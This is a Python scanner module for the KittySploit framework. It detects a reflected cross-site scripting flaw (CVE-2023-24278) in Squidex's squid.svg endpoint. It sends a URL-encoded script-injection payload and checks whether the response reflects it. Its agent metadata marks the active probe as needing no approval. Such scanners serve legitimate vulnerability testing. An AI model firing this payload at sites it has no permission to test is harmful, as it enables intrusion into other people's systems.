#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Squidex before 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Squidex <7.4.0 - Cross-Site Scripting Detection',
        'description': 'Squidex before 7.4.0 contains a cross-site scripting vulnerability via the squid.svg endpoint. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xss', 'squidex', 'cms', 'unauth', 'squidex.io', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://census-labs.com/news/2023/03/16/reflected-xss-vulnerabilities-in-squidex-squidsvg-endpoint/',
            'https://www.openwall.com/lists/oss-security/2023/03/16/1',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-24278',
            'https://github.com/karimhabush/cyberowl',
        ],
        'cve': 'CVE-2023-24278',
    }

    def run(self):
        r = self.http_request(method="GET", path='/squid.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<script>alert(document.domain)</script>', 'looking for!',)
        header_any = ('image/svg+xml',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Squidex <7.4.0 - Cross-Site Scripting detected",
                path='/squid.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small',
            )
            return True
        return False

